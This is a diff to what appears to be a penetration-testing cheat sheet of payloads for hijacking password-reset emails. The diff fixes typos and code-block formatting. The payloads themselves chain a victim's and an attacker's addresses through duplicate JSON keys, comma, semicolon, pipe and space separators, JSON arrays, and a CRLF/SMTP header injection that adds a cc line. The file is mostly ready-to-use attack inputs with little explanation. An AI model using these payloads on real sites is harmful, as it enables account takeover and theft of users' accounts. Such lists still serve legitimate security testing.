@@ -12,7 +12,7 @@
 {"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
 ```
 
-## Semiclon saperator with HPP chain
+## Semicolon saperator with HPP chain
 ```
 {"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
 {"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
@@ -44,11 +44,12 @@ email=victim@gmail.com&email=attacker@gmail.com
 ## CRLF and SMTP Inejciton
 ```
 email=victim@gmail.com%0a%0dcc:attacker@gmail.com
+{"email":["victim@gmail.com","attacker@gmail.com"]}
 ```
 
-{"email":["victim@gmail.com","attacker@gmail.com"]}
-
-#Using Seperators
+## Using Seperators
+```
 email=victim@gmail.com,attacker@gmail.com
 email=victim@gmail.com|attacker@gmail.com
 email=victim@gmail.com%20attacker@gmail.com
+```
